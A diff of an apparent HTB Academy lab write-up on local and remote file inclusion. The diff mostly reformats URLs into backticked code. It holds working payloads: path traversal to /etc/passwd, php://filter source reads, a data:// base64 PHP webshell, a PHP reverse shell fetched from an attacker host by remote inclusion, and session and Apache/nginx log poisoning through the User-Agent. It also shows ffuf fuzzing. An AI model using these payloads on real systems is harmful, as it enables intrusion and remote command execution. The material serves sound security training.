@@ -105,8 +105,7 @@ manner.
 Now those files are retrieves from the current directory the server is operating
 on. So lets try to use relative path to obtain the file where the usernames are
 located – '/etc/passwd'. (full path wont work):
-http://<target-IP>:<target-
-port>/index.php?language=../../../../etc/passwd
+`http://<target-IP>:<target-port>/index.php?language=../../../../etc/passwd`
 *the reason we need 4 '../' is because in default linux web servers (apache in
 this case, we can determine by looking at the http response header), operate in
 '/var/www/html' and in it the 'languages' directory, where the languages
@@ -131,8 +130,7 @@ a bit:
 #### Technical Methodology & Exploit Execution:
 
 we will use the same principal as the last question:
-http://<target-IP>:<target-
-port>/index.php?language=../../../../usr/share/flags/flag.tx
+`http://<target-IP>:<target-port>/index.php?language=../../../../usr/share/flags/flag.tx`
 t
 
 ![Figure 3.1 — Lab execution and output verification (Page 3)](/assets/images/posts/htb-academy/file-inclusion/p003_01.jpg)
@@ -157,7 +155,7 @@ So the bypassing it will be simple, for rule a we will simply begin the path wit
 'languages', and for rule b we will insert '….//' instead of '../', the server side
 will truncate the '../' from '….//' ('....//') so the output will be '../' – what we
 need, we will multiply that 4 times to get to the base directory '/':
-http://<target-IP>:<target-port>/index.php?
+`http://<target-IP>:<target-port>/index.php?`
 languages/....//....//....//....//flag.txt
 
 ![Figure 4.1 — Lab execution and output verification (Page 4)](/assets/images/posts/htb-academy/file-inclusion/p004_01.jpg)
@@ -178,10 +176,8 @@ First lets run bruteforce with the tool 'fuff' to find php pages, using
 the wordlist '/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-
 small.txt' which is pre-installed on the pwnbox.  we will use the command:
 ```bash
-ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-
+ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<target-IP>:<target-port>/FUZZ.php
 ```
-list-2.3-small.txt:FUZZ -u http://<target-IP>:<target-
-port>/FUZZ.php
 
 
 *
@@ -203,8 +199,7 @@ matter, not just the 200 OK.
 Now lets try to access it on the browser, normal access will not work – there
 are defenses in place against this, so we will base-64 encode our URL path
 request:
-http://<target-IP>:<target-
-port>/index.php?language=php://filter/read=convert.base64-
+`http://<target-IP>:<target-port>/index.php?language=php://filter/read=convert.base64-`
 encode/resource=configure
 
 
@@ -238,8 +233,7 @@ is located in '/etc/php/X.Y/apache2/php.ini'.
 We can obtain it using the directory traversal + base 64 encoding Local File
 Inclusion technique:
 
-http://<target-IP>:<target-
-port>/index.php?language=php://filter/read=convert.base64-
+`http://<target-IP>:<target-port>/index.php?language=php://filter/read=convert.base64-`
 encode/resource=../../../../etc/php/7.4/apache2/php.ini
 
 ![Figure 7.1 — Lab execution and output verification (Page 7)](/assets/images/posts/htb-academy/file-inclusion/p007_01.jpg)
@@ -286,15 +280,13 @@ required due to the server security mechanism.
 
 Now we can put it on 'data://text/plain;base64' wrapper, and enter it as URL,
 and run simple command to confirm it works:
-http://<target-IP>:<target-
-port>/index.php?language=data://text/plain;base64,PD9waHAgc3
+`http://<target-IP>:<target-port>/index.php?language=data://text/plain;base64,PD9waHAgc3`
 lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
 
 
 It works! We got the output for 'id' command.
 Lets replace the 'id' with 'ls /':
-http://<target-IP>:<target-
-port>/index.php?language=data://text/plain;base64,PD9waHAgc3
+`http://<target-IP>:<target-port>/index.php?language=data://text/plain;base64,PD9waHAgc3`
 lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=ls /
 
 
@@ -323,12 +315,11 @@ It seems this weird '37809e2f8952f06139011994726d9ef1.txt' is our flag.
 in this question unlike previous questions, the website is being run on
 default http port 80 and not random target port.
 So lets enter the website:
-http://<target-IP>
+`http://<target-IP>`
 
 and we do similar process to obtain the php configuration file and confirm
 'allow_url_include' is active:
-http://<target-
-IP>/index.php?language=php://filter/read=convert.base64-
+`http://<target-IP>/index.php?language=php://filter/read=convert.base64-`
 encode/resource=en.php
 
 ![Figure 10.1 — Lab execution and output verification (Page 10)](/assets/images/posts/htb-academy/file-inclusion/p010_01.jpg)
@@ -345,8 +336,7 @@ it self is not guaranteed to always work in real world environment. *
 As adviced on the section's guide, we will first attempt to include a local URL,
 to make sure it will not get blocked by web application firewall (WAF) or any
 other security mechanism:
-http://<target-
-IP>/index.php?language=http://127.0.0.1:80/index.php
+`http://<target-IP>/index.php?language=http://127.0.0.1:80/index.php`
 
 ![Figure 11.1 — Lab execution and output verification (Page 11)](/assets/images/posts/htb-academy/file-inclusion/p011_01.jpg)
 *_Figure 11.1 — Lab execution and output verification (Page 11)_*
@@ -383,18 +373,17 @@ Next, on the same directory where we set the normal shell.php, we will create
 a new file called 'reverse_shell.php'
 There we will enter the following content to the 'reverse_shell.php':
 <?php
-$ip = '<attacker-IP>';  // Attacker IP
+$ip = '`<attacker-IP>`';  // Attacker IP
 $port = 4444;         // Attacker port
 $sock = fsockopen($ip, $port);
 $proc = proc_open('/bin/sh', array(0 => $sock, 1 => $sock, 2
 => $sock), $pipes);
 ?>
-*do make sure to change <attacker-IP> to your attacking machine's IP . *
+*do make sure to change `<attacker-IP>` to your attacking machine's IP . *
 
 Next, of course while the python server is running on the 'reverse_shell.php'
 directory, we will enter the following URL:
-http://<target-IP>/index.php?language=http://<attacker-
-IP>:8080/reverse_shell.php
+`http://<target-IP>/index.php?language=http://<attacker-IP>:8080/reverse_shell.php`
 
 ![Figure 13.1 — Lab execution and output verification (Page 13)](/assets/images/posts/htb-academy/file-inclusion/p013_01.jpg)
 *_Figure 13.1 — Lab execution and output verification (Page 13)_*
@@ -447,7 +436,7 @@ cat /exercise/flag.txt
 #### Technical Methodology & Exploit Execution:
 
 for this section we are provided with the page '/settings.php':
-http://<target-IP>:>target-port>/settings.php
+`http://<target-IP>:>target-port>/settings.php`
 
 
 
@@ -473,8 +462,7 @@ Now, lets upload our 'shell.gif' file (click the avatar image, then select 'shel
 
 #### Technical Methodology & Exploit Execution:
 
-http://<target-IP>:<target-
-port>/index.php?language=./profile_images/shell.gif&cmd=id
+`http://<target-IP>:<target-port>/index.php?language=./profile_images/shell.gif&cmd=id`
 
 
 It works (ignore the 'GIF8' in the beginning).
@@ -493,13 +481,11 @@ It works (ignore the 'GIF8' in the beginning).
 ### Now lets locate the obtain the flag from '/' directory
 
 Now lets locate the obtain the flag from '/' directory:
-http://<target-IP>:<target-
-port>/index.php?language=./profile_images/shell.gif&cmd=ls /
+`http://<target-IP>:<target-port>/index.php?language=./profile_images/shell.gif&cmd=ls /`
 
 
 The flag file is '2f40d853e2d4768d87da1c81772bae0a.txt'
-http://<target-IP>:<target-
-port>/index.php?language=./profile_images/shell.gif&cmd=cat
+`http://<target-IP>:<target-port>/index.php?language=./profile_images/shell.gif&cmd=cat`
 /2f40d853e2d4768d87da1c81772bae0a.txt
 
 ![Figure 17.1 — Lab execution and output verification (Page 17)](/assets/images/posts/htb-academy/file-inclusion/p017_01.jpg)
@@ -522,7 +508,7 @@ port>/index.php?language=./profile_images/shell.gif&cmd=cat
 pwd
 Answer: /var/www/html
 Method: lets enter the target website:
-http://<target-IP>:<target-port>
+`http://<target-IP>:<target-port>`
 
 open web developer tool → storage → cookies:
 
@@ -530,10 +516,9 @@ The cookie in this session is 'PHPSESSID:"79tvi87ic9qrpcm5ukftlq3lhj"' and its
 value is '79tvi87ic9qrpcm5ukftlq3lhj'.
 
 Now, as in linux the cookies are stored in '/var/lib/php/sessions/', with
-filename with the prefix 'sess' – like 'sess_<cookie-value>' – we can use local
+filename with the prefix 'sess' – like 'sess_`<cookie-value>`' – we can use local
 file inclusion to get the file's content:
-http://<target-IP>:<target-
-port>/index.php?language=/var/lib/php/sessions/sess_<cookie-
+`http://<target-IP>:<target-port>/index.php?language=/var/lib/php/sessions/sess_<cookie-`
 value>
 
 ![Figure 18.1 — Lab execution and output verification (Page 18)](/assets/images/posts/htb-academy/file-inclusion/p018_01.jpg)
@@ -555,7 +540,7 @@ Basically is we've shown that we can modify the content of 'sess_<cookie-
 value>' file on the server, by changing the value of the 'language' parameter.
 
 So lets set 'language' – to php webshell:
-http://<target-IP>:<target-port>/index.php
+`http://<target-IP>:<target-port>/index.php`
 ?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%
 3F%3E
 
@@ -582,12 +567,11 @@ with the cmd command 'pwd':
 #### Technical Methodology & Exploit Execution:
 
 lets open the website in burpsuite browser (proxy, interceptor off):
-http://<target-IP>:<target-port>
+`http://<target-IP>:<target-port>`
 
 now lets use the local file inclusion to access apache log file (still burpsuite
 proxy interceptor off):
-http://<target-IP>:<target-
-port>?language=/var/log/apache2/access.log
+`http://<target-IP>:<target-port>?language=/var/log/apache2/access.log`
 
 ![Figure 20.1 — Lab execution and output verification (Page 20)](/assets/images/posts/htb-academy/file-inclusion/p020_01.jpg)
 *_Figure 20.1 — Lab execution and output verification (Page 20)_*
@@ -634,8 +618,7 @@ potent:
 And forward..
 Now, interceptor off again. If the server did got the payload user-agent, we
 should be able to execute commands on the 'access.log' page:
-http://<target-IP>:<target-
-port>?language=/var/log/apache2/access.log&cmd=ls /
+`http://<target-IP>:<target-port>?language=/var/log/apache2/access.log&cmd=ls /`
 
 ![Figure 23.1 — Lab execution and output verification (Page 23)](/assets/images/posts/htb-academy/file-inclusion/p023_01.jpg)
 *_Figure 23.1 — Lab execution and output verification (Page 23)_*
@@ -648,8 +631,7 @@ port>?language=/var/log/apache2/access.log&cmd=ls /
 ### The file near the red arrow is our flag
 
 The file near the red arrow is our flag:
-http://<target-IP>:<target-
-port>?language=/var/log/apache2/access.log&cmd=cat
+`http://<target-IP>:<target-port>?language=/var/log/apache2/access.log&cmd=cat`
 /c85ee5082f4c723ace6c0796e3a3db09.txt
 
 
@@ -659,7 +641,7 @@ url path. *
 
 Another method which will not be demonstrated here is to insert the
 command directly to the user-agent payload:
-<?php system('<command>');?>
+<?php system('`<command>`');?>
 
 Like this:
 <?php system('cat /c85ee5082f4c723ace6c0796e3a3db09.txt');?>
@@ -683,9 +665,8 @@ the exposed parameters. And the wordlist
 Download it from the link above (download it manually, don't use 'wget').
 Now lets run the bruteforce:
 ```bash
-ffuf -w burp-parameter-names.txt:FUZZ -u 'http://<target-
+ffuf -w burp-parameter-names.txt:FUZZ -u 'http://<target-IP>:<target-port>/index.php?FUZZ=value'
 ```
-IP>:<target-port>/index.php?FUZZ=value'
 
 
 *
@@ -712,9 +693,8 @@ the same size (and words and lines). Lets try to filter out that size – 2309. 
 will also add '-s' to suppress any redundant output (progress bar, further info
 and such..):
 ```bash
-ffuf -w burp-parameter-names.txt:FUZZ -u 'http://<target-
+ffuf -w burp-parameter-names.txt:FUZZ -u 'http://<target-IP>:<target-port>/index.php?FUZZ=value' -fs 2309 -s
 ```
-IP>:<target-port>/index.php?FUZZ=value' -fs 2309 -s
 
 
 The automation script found 'view' as our parameter property.
@@ -723,9 +703,8 @@ For that we will use our second wordlist - 'LFI-Jhaddix.txt', also that is to be
 downloaded manually, and not with 'wget'.
 Lets run the command to locate the proper parameter value:
 ```bash
-ffuf -w LFI-Jhaddix.txt:FUZZ -u 'http://<target-IP>:<target-
+ffuf -w LFI-Jhaddix.txt:FUZZ -u 'http://<target-IP>:<target-port>/index.php?view=FUZZ'
 ```
-port>/index.php?view=FUZZ'
 
 
 *
@@ -747,14 +726,12 @@ port>/index.php?view=FUZZ'
 Once again, output flood. And they all seem to be 1953 bytes long, so lets
 exclude that as well in the same manner:
 ```bash
-ffuf -w LFI-Jhaddix.txt:FUZZ -u 'http://<target-IP>:<target-
+ffuf -w LFI-Jhaddix.txt:FUZZ -u 'http://<target-IP>:<target-port>/index.php?view=FUZZ' -fs 1935 -s
 ```
-port>/index.php?view=FUZZ' -fs 1935 -s
 
 
 Those parameters seem to work. lets test that on the browser:
-http://<target-IP>:<target-
-port>/index.php?view=../../../../../../../../../../../../../
+`http://<target-IP>:<target-port>/index.php?view=../../../../../../../../../../../../../`
 ../../../../../../../../../etc/passwd
 
 ![Figure 27.1 — Lab execution and output verification (Page 27)](/assets/images/posts/htb-academy/file-inclusion/p027_01.jpg)
@@ -772,8 +749,7 @@ port>/index.php?view=../../../../../../../../../../../../../
 
 We got a hit! that's the '/etc/passwd' content.
 Lets replace the '/etc/passwd' with '/flag.txt':
-http://<target-IP>:<target-
-port>/index.php?view=../../../../../../../../../../../../../
+`http://<target-IP>:<target-port>/index.php?view=../../../../../../../../../../../../../`
 ../../../../../../../../../flag.txt
 
 ![Figure 28.1 — Lab execution and output verification (Page 28)](/assets/images/posts/htb-academy/file-inclusion/p028_01.jpg)
@@ -875,7 +851,7 @@ system('ls');
 And save.
 
 Now lets test this dummy page. in the pwnbox, lets enter this dummy page:
-http://<target-IP>/test.php
+`http://<target-IP>/test.php`
 
 
 Once entered, lets check the error log in the target machine:
@@ -910,13 +886,13 @@ The missing word is 'security'
 target IP and target ports will change in the screenshots throughout the
 solution. *
 We will begin by looking at the website:
-http://<target-IP>:<target-port>
+`http://<target-IP>:<target-port>`
 
 
 Looks fine enough, several pages. Lets see one of them, contact for example:
 
-We can see the URL format is '/index.php?page=<page>', where in this case,
-<page> is 'contact'.
+We can see the URL format is '/index.php?page=`<page>`', where in this case,
+`<page>` is 'contact'.
 
 ![Figure 32.1 — Lab execution and output verification (Page 32)](/assets/images/posts/htb-academy/file-inclusion/p032_01.jpg)
 *_Figure 32.1 — Lab execution and output verification (Page 32)_*
@@ -937,9 +913,8 @@ We will also use the wordlist 'Directories_All.wordlist', and I will tell you
 upfront to use the flags '-fs 4322 -s', which their purpose was covered in
 'Automated Scanning' section in detail:
 ```bash
-ffuf -w Directories_All.wordlist:FUZZ -u 'http://<target-
+ffuf -w Directories_All.wordlist:FUZZ -u 'http://<target-IP>:<target-port>/index.php?page=FUZZ' -fs 4322 -s
 ```
-IP>:<target-port>/index.php?page=FUZZ' -fs 4322 -s
 
 
 Those are the values received. 'main', 'contact' and 'about' can be reached
@@ -949,8 +924,7 @@ traversal.
 'index' however.. that is worth looking further inspection
 
 Well then, we will use the base64 encoded page retrieval on the index page:
-http://<target-IP>:<target-
-port>/index.php?page=php://filter/read=convert.base64-
+`http://<target-IP>:<target-port>/index.php?page=php://filter/read=convert.base64-`
 encode/resource=index
 
 ![Figure 33.1 — Lab execution and output verification (Page 33)](/assets/images/posts/htb-academy/file-inclusion/p033_01.jpg)
@@ -968,11 +942,11 @@ We can see the base64 encoded index page. Lets decode it:
 We can see this extra line in the page source, which was not in the original
 page.
 That line reveals another path: 'ilf_admin/index.php'. lets check it out:
-http://<target-IP>:<target-port>/ilf_admin/index.php
+`http://<target-IP>:<target-port>/ilf_admin/index.php`
 
 
 We get to this Admin panel with those 3 logs. We wont use those logs,
-however clicking on any of them reveals the parameter '?log=<value>':
+however clicking on any of them reveals the parameter '?log=`<value>`':
 
 lets run here ffuff automated directory traversal to see where can we get.
 
@@ -991,9 +965,8 @@ lets run here ffuff automated directory traversal to see where can we get.
 
 We will use the wordlist 'LFI-Jhaddix.txt'
 ```bash
-ffuf -w LFI-Jhaddix.txt:FUZZ -u 'http://<target-IP>:<target-
+ffuf -w LFI-Jhaddix.txt:FUZZ -u 'http://<target-IP>:<target-port>/ilf_admin/index.php?log=FUZZ' -fs 2046 -s
 ```
-port>/ilf_admin/index.php?log=FUZZ' -fs 2046 -s
 *yes, here we will put upfront the '-fs 2046', for the same reason. *
 
 *
@@ -1004,8 +977,7 @@ the username lists on linux (which we can confirm it is linux with 'nmap -sV').
 Now – the lowest number of '../' that is required for sucsessfull access to the
 file is 5. So lets enter the URL:
 
-http://<target-IP>:<target-
-port>/ilf_admin/index.php?log=/../../../../../etc/passwd
+`http://<target-IP>:<target-port>/ilf_admin/index.php?log=/../../../../../etc/passwd`
 
 
 It works. Here is the list of usernames.
@@ -1038,8 +1010,7 @@ browser settings (3 lines or 3 dots on the side of the browser → 'More Tools' 
 The server is 'nginx'.
 Meaning, the access.log will be located in '/var/log/nginx/access.log'
 Lets access that file in the same method we accessed the '/etc/passwd':
-http://<target-IP>:<target-
-port>/ilf_admin/index.php?log=/../../../../../var/log/nginx/
+`http://<target-IP>:<target-port>/ilf_admin/index.php?log=/../../../../../var/log/nginx/`
 access.log
 
 ![Figure 36.1 — Lab execution and output verification (Page 36)](/assets/images/posts/htb-academy/file-inclusion/p036_01.jpg)
@@ -1080,8 +1051,7 @@ In the response, we scroll down to the end of the log – and observe the file
 
 It might be visible better on the browser (this time when we know the flag's file
 name, we can obtain it directly without the use of remote code execution):
-http://<target-IP>:<target-
-port>/ilf_admin/index.php?log=/../../../../../flag_dacc60f23
+`http://<target-IP>:<target-port>/ilf_admin/index.php?log=/../../../../../flag_dacc60f23`
 48d.txt
 
 ![Figure 38.1 — Lab execution and output verification (Page 38)](/assets/images/posts/htb-academy/file-inclusion/p038_01.png)
